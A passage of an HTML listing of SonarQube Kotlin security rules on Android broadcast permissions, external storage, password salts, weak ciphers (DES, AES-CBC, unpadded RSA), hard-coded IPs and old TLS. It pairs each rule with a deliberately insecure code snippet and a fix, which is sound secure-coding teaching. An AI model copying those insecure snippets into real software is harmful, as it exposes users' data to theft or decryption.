<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2019-1677" rel="nofollow">CVE-2019-1677</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2015-1275" rel="nofollow">CVE-2015-1275</a> </li></ul>
<p>Receivers can be declared in the manifest or in the code to make them context-specific. If the receiver is declared in the manifest Android will
start the application if it is not already running once a matching broadcast is received. The receiver is an entry point into the application.</p>
<p>Other applications can send potentially malicious broadcasts, so it is important to consider broadcasts as untrusted and to limit the applications
that can send broadcasts to the receiver.</p>
<p>Permissions can be specified to restrict broadcasts to authorized applications. Restrictions can be enforced by both the sender and receiver of a
broadcast. If permissions are specified when registering a broadcast receiver, then only broadcasters who were granted this permission can send a
message to the receiver.</p>
<p>This rule raises an issue when a receiver is registered without specifying any broadcast permission.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The data extracted from intents is not sanitized. </li><li> Intents broadcast is not restricted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Restrict the access to broadcasted intents. See the <a href="https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions" rel="nofollow">Android documentation</a> for more
information.</p>
<h2>Sensitive Code Example</h2>
<pre>
import android.content.BroadcastReceiver
import android.content.Context
import android.content.IntentFilter
import android.os.Build
import android.os.Handler
import androidx.annotation.RequiresApi

class MyIntentReceiver {
    &#64;RequiresApi(api &#61; Build.VERSION_CODES.O)
    fun register(
        context: Context, receiver: BroadcastReceiver?,
        filter: IntentFilter?,
        scheduler: Handler?,
        flags: Int
    ) {
        context.registerReceiver(receiver, filter) // Sensitive
        context.registerReceiver(receiver, filter, flags) // Sensitive

        // Broadcasting intent with &#34;null&#34; for broadcastPermission
        context.registerReceiver(receiver, filter, null, scheduler) // Sensitive
        context.registerReceiver(receiver, filter, null, scheduler, flags) // Sensitive
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import android.content.BroadcastReceiver
import android.content.Context
import android.content.IntentFilter
import android.os.Build
import android.os.Handler
import androidx.annotation.RequiresApi

class MyIntentReceiver {
    &#64;RequiresApi(api &#61; Build.VERSION_CODES.O)
    fun register(
        context: Context, receiver: BroadcastReceiver?,
        filter: IntentFilter?,
        broadcastPermission: String?,
        scheduler: Handler?,
        flags: Int
    ) {
        context.registerReceiver(receiver, filter, broadcastPermission, scheduler)
        context.registerReceiver(receiver, filter, broadcastPermission, scheduler, flags)
    }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Platform Interaction Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage" rel="nofollow">OWASP Mobile Top 10 2016 Category M1</a> - Improper
  Platform Usage </li><li> <a href="https://cwe.mitre.org/data/definitions/925" rel="nofollow">MITRE, CWE-925</a> - Improper Verification of Intent by Broadcast Receiver </li><li> <a href="https://cwe.mitre.org/data/definitions/926" rel="nofollow">MITRE, CWE-926</a> - Improper Export of Android Application Components </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li><li> <a href="https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions" rel="nofollow">Android documentation</a> -
  Broadcast Overview - Security considerations and best practices </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S5324">
              kotlin:S5324
            </a>
          </td>
          <td>
            <details>
              <p>Storing data locally is a common task for mobile applications. Such data includes files among other things. One convenient way to store files is to
use the external file storage which usually offers a larger amount of disc space compared to internal storage.</p>
<p>Files created on the external storage are globally readable and writable. Therefore, a malicious application having the permissions
<code>WRITE_EXTERNAL_STORAGE</code> or <code>READ_EXTERNAL_STORAGE</code> could try to read sensitive information from the files that other
applications have stored on the external storage.</p>
<p>External storage can also be removed by the user (e.g when based on SD card) making the files unavailable to the application.</p>
<h2>Ask Yourself Whether</h2>
<p>Your application uses external storage to:</p>
<ul><li> store files that contain sensitive data. </li><li> store files that are not meant to be shared with other application. </li><li> store files that are critical for the application to work. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use internal storage whenever possible as the system prevents other apps from accessing this location. </li><li> Only use external storage if you need to share non-sensitive files with other applications. </li><li> If your application has to use the external storage to store sensitive data, make sure it encrypts the files using <a href="https://developer.android.com/reference/androidx/security/crypto/EncryptedFile" rel="nofollow">EncryptedFile</a>. </li><li> Data coming from external storage should always be considered untrusted and should be validated. </li><li> As some external storage can be removed, make sure to never store files on it that are critical for the usability of your application. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
import android.content.Context

class AccessExternalFiles {

    fun accessFiles(Context context) {
        context.getExternalFilesDir(null) // Sensitive
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import android.content.Context
import android.os.Environment

class AccessExternalFiles {

    fun accessFiles(Context context) {
        context.getFilesDir()
    }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://developer.android.com/training/articles/security-tips#ExternalStorage" rel="nofollow">Android Security tips on external file storage</a>
  </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Data Storage and Privacy Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage" rel="nofollow">OWASP Mobile Top 10 2016 Category M2</a> - Insecure
  Data Storage </li><li> <a href="https://cwe.mitre.org/data/definitions/312" rel="nofollow">MITRE, CWE-312</a> - Cleartext Storage of Sensitive Information </li><li> <a href="https://www.sans.org/top25-software-errors/#cat2" rel="nofollow">SANS Top 25</a> - Risky Resource Management </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S2053">
              kotlin:S2053
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability increases the likelihood that attackers are able to compute the cleartext of password hashes.</p>
<h2>Why is this an issue?</h2>
<p>During the process of password hashing, an additional component, known as a &#34;salt,&#34; is often integrated to bolster the overall security. This salt,
acting as a defensive measure, primarily wards off certain types of attacks that leverage pre-computed tables to crack passwords.</p>
<p>However, potential risks emerge when the salt is deemed insecure. This can occur when the salt is consistently the same across all users or when it
is too short or predictable. In scenarios where users share the same password and salt, their password hashes will inevitably mirror each other.
Similarly, a short salt heightens the probability of multiple users unintentionally having identical salts, which can potentially lead to identical
password hashes. These identical hashes streamline the process for potential attackers to recover clear-text passwords. Thus, the emphasis on
implementing secure, unique, and sufficiently lengthy salts in password-hashing functions is vital.</p>
<h3>What is the potential impact?</h3>
<p>Despite best efforts, even well-guarded systems might have vulnerabilities that could allow an attacker to gain access to the hashed passwords.
This could be due to software vulnerabilities, insider threats, or even successful phishing attempts that give attackers the access they need.</p>
<p>Once the attacker has these hashes, they will likely attempt to crack them using a couple of methods. One is brute force, which entails trying
every possible combination until the correct password is found. While this can be time-consuming, having the same salt for all users or a short salt
can make the task significantly easier and faster.</p>
<p>If multiple users have the same password and the same salt, their password hashes would be identical. This means that if an attacker successfully
cracks one hash, they have effectively cracked all identical ones, granting them access to multiple accounts at once.</p>
<p>A short salt, while less critical than a shared one, still increases the odds of different users having the same salt. This might create clusters
of password hashes with identical salt that can then be attacked as explained before.</p>
<p>With short salts, the probability of a collision between two users&#39; passwords and salts couple might be low depending on the salt size. The shorter
the salt, the higher the collision probability. In any case, using longer, cryptographically secure salt should be preferred.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code contains examples of hard-coded salts.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import javax.crypto.spec.PBEParameterSpec

fun hash() {
    val salt &#61; &#34;salty&#34;.toByteArray()
    val cipherSpec &#61; PBEParameterSpec(salt, 10000) // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import java.security.SecureRandom
import javax.crypto.spec.PBEParameterSpec

fun hash() {
    val random &#61; SecureRandom()
    val salt &#61; ByteArray(16)
    random.nextBytes(salt)
    val cipherSpec &#61; PBEParameterSpec(salt, 10000)
}
</pre>
<h3>How does this work?</h3>
<p>This code ensures that each user’s password has a unique salt value associated with it. It generates a salt randomly and with a length that
provides the required security level. It uses a salt length of at least 16 bytes (128 bits), as recommended by industry standards.</p>
<p>Here, the compliant code example ensures the salt is random and has a sufficient length by calling the <code>nextBytes</code> method from the
<code>SecureRandom</code> class with a salt buffer of 16 bytes. This class implements a cryptographically secure pseudo-random number generator.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP</a> Top 10:2021 A02:2021 - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP</a> - Top 10 2017 - A03:2017 - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/759" rel="nofollow">CWE</a> - CWE-759: Use of a One-Way Hash without a Salt </li><li> <a href="https://cwe.mitre.org/data/definitions/760" rel="nofollow">CWE</a> - CWE-760: Use of a One-Way Hash with a Predictable Salt </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S5320">
              kotlin:S5320
            </a>
          </td>
          <td>
            <details>
              <p>In Android applications, broadcasting intents is security-sensitive. For example, it has led in the past to the following vulnerability:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-9489" rel="nofollow">CVE-2018-9489</a> </li></ul>
<p>By default, broadcasted intents are visible to every application, exposing all sensitive information they contain.</p>
<p>This rule raises an issue when an intent is broadcasted without specifying any &#34;receiver permission&#34;.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The intent contains sensitive information. </li><li> Intent reception is not restricted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Restrict the access to broadcasted intents. See <a href="https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions" rel="nofollow">Android documentation</a> for more
information.</p>
<h2>Sensitive Code Example</h2>
<pre>
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.UserHandle

public class MyIntentBroadcast {
    fun broadcast(intent: Intent,
                  context: Context,
                  user: UserHandle,
                  resultReceiver: BroadcastReceiver,
                  scheduler: Handler,
                  initialCode: Int,
                  initialData: String,
                  initialExtras: Bundle,
                  broadcastPermission: String) {
        context.sendBroadcast(intent) // Sensitive
        context.sendBroadcastAsUser(intent, user) // Sensitive

        // Broadcasting intent with &#34;null&#34; for receiverPermission
        context.sendBroadcast(intent, null) // Sensitive
        context.sendBroadcastAsUser(intent, user, null) // Sensitive
        context.sendOrderedBroadcast(intent, null) // Sensitive
        context.sendOrderedBroadcastAsUser(intent, user, null, resultReceiver,
            scheduler, initialCode, initialData, initialExtras) // Sensitive
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.UserHandle

public class MyIntentBroadcast {
    fun broadcast(intent: Intent,
                  context: Context,
                  user: UserHandle,
                  resultReceiver: BroadcastReceiver,
                  scheduler: Handler,
                  initialCode: Int,
                  initialData: String,
                  initialExtras: Bundle,
                  broadcastPermission: String) {

        context.sendBroadcast(intent, broadcastPermission)
        context.sendBroadcastAsUser(intent, user, broadcastPermission)
        context.sendOrderedBroadcast(intent, broadcastPermission)
        context.sendOrderedBroadcastAsUser(intent, user,broadcastPermission, resultReceiver,
            scheduler, initialCode, initialData, initialExtras)
    }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Platform Interaction Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage" rel="nofollow">OWASP Mobile Top 10 2016 Category M1</a> - Improper
  Platform Usage </li><li> <a href="https://cwe.mitre.org/data/definitions/927" rel="nofollow">MITRE, CWE-927</a> - Use of Implicit Intent for Sensitive Communication </li><li> <a href="https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions" rel="nofollow">Android documentation</a> -
  Broadcast Overview - Security considerations and best practices </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S5547">
              kotlin:S5547
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for
several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection. </li><li> Security during transmission or on storage devices. </li><li> Data integrity, general trust, and authentication. </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Java Cryptographic Extension</h2>
<h3>Code examples</h3>
<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import javax.crypto.NoSuchPaddingException
import java.security.NoSuchAlgorithmException
import javax.crypto.Cipher

fun main(args: Array&lt;String&gt;) {
    try {
        val des &#61; Cipher.getInstance(&#34;DES&#34;) // Noncompliant
    } catch (e: NoSuchAlgorithmException) {
        // ...
    } catch (e: NoSuchPaddingException) {
        // ...
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import javax.crypto.NoSuchPaddingException
import java.security.NoSuchAlgorithmException
import javax.crypto.Cipher

fun main(args: Array&lt;String&gt;) {
    try {
        val aes &#61; Cipher.getInstance(&#34;AES/GCM/NoPadding&#34;)
    } catch (e: NoSuchAlgorithmException) {
        // ...
    } catch (e: NoSuchPaddingException) {
        // ...
    }
}
</pre>
<h3>How does this work?</h3>
<h4>Use a secure algorithm</h4>
<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an
algorithm is the Advanced Encryption Standard (AES).</p>
<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S5542">
              kotlin:S5542
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>For AES, the weakest modes are CBC (Cipher Block Chaining) and ECB</p>
<p>(Electronic Codebook), as they are either vulnerable to padding oracles or do not provide authentication mechanisms.</p>
<p>And for RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Java Cryptographic Extension</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>Example with a symmetric cipher, AES:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
import javax.crypto.Cipher
import javax.crypto.NoSuchPaddingException
import java.security.NoSuchAlgorithmException

fun main(args: Array&lt;String&gt;) {
    try {
        val aes &#61; Cipher.getInstance(&#34;AES/CBC/PKCS5Padding&#34;); // Noncompliant
    } catch (e: NoSuchAlgorithmException) {
        // ...
    } catch (e: NoSuchPaddingException) {
        // ...
    }
}
</pre>
<p>Example with an asymmetric cipher, RSA:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
import javax.crypto.Cipher
import javax.crypto.NoSuchPaddingException
import java.security.NoSuchAlgorithmException

fun main(args: Array&lt;String&gt;) {
    try {
        val rsa &#61; Cipher.getInstance(&#34;RSA/None/NoPadding&#34;); // Noncompliant
    } catch (e: NoSuchAlgorithmException) {
        // ...
    } catch (e: NoSuchPaddingException) {
        // ...
    }
}
</pre>
<h4>Compliant solution</h4>
<p>For the AES symmetric cipher, use the GCM mode:</p>
<pre data-diff-id="1" data-diff-type="compliant">
import javax.crypto.Cipher
import javax.crypto.NoSuchPaddingException
import java.security.NoSuchAlgorithmException

fun main(args: Array&lt;String&gt;) {
    try {
        val aes &#61; Cipher.getInstance(&#34;AES/GCM/NoPadding&#34;);
    } catch (e: NoSuchAlgorithmException) {
        // ...
    } catch (e: NoSuchPaddingException) {
        // ...
    }
}
</pre>
<p>For the RSA asymmetric cipher, use the Optimal Asymmetric Encryption Padding (OAEP):</p>
<pre data-diff-id="2" data-diff-type="compliant">
import javax.crypto.Cipher
import javax.crypto.NoSuchPaddingException
import java.security.NoSuchAlgorithmException

fun main(args: Array&lt;String&gt;) {
    try {
        val rsa &#61; Cipher.getInstance(&#34;RSA/ECB/OAEPWITHSHA-256ANDMGF1PADDING&#34;);
    } catch (e: NoSuchAlgorithmException) {
        // ...
    } catch (e: NoSuchPaddingException) {
        // ...
    }
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>Appropriate choices are currently the following.</p>
<h4>For AES: Use Galois/Counter mode (GCM)</h4>
<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and
authenticity of data.</p>
<p>Other similar modes are:</p>
<ul><li> CCM: <code>Counter with CBC-MAC</code> </li><li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li><li> EAX: <code>Encrypt-and-Authenticate</code> </li><li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li><li> OCB: <code>Offset Codebook Mode</code> </li></ul>
<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it</p>
<p>is considered more straightforward to use AES-GCM directly instead.</p>
<h4>For RSA: use the OAEP scheme</h4>
<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of
RSA.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode" rel="nofollow">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ" rel="nofollow">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S1313">
              kotlin:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-5901" rel="nofollow">CVE-2006-5901</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2005-3725" rel="nofollow">CVE-2005-3725</a> </li></ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul><li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li><li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li></ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul><li> Can give information to an attacker about the network topology. </li><li> It’s a personal (assigned to an identifiable person) IP address. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
val ip &#61; &#34;192.168.12.42&#34;
val socket &#61; ServerSocket(ip, 6667)
</pre>
<h2>Compliant Solution</h2>
<pre>
val ip &#61; System.getenv(&#34;myapplication.ip&#34;)
val socket &#61; ServerSocket(ip, 6667)
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul><li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li><li> Broadcast address 255.255.255.255 </li><li> Non-routable address 0.0.0.0 </li><li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm" rel="nofollow">often match
  Object Identifiers</a> (OID) </li><li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc5737" rel="nofollow">RFC 5737</a> </li><li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849" rel="nofollow">RFC
  3849</a> </li><li> Addresses from ::ffff:0:127.0.0.1 to ::ffff:0:127.255.255.255 and from ::ffff:127.0.0.1 to ::ffff:127.255.255.255, which are local IPv4-mapped
  IPv6 addresses </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S4423">
              kotlin:S4423
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are
all considered weak by the cryptographic community, and are officially deprecated:</p>
<ul><li> SSL versions 1.0, 2.0 and 3.0 </li><li> TLS versions 1.0 and 1.1 </li></ul>
<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform
mathematical attacks on this data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br /> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
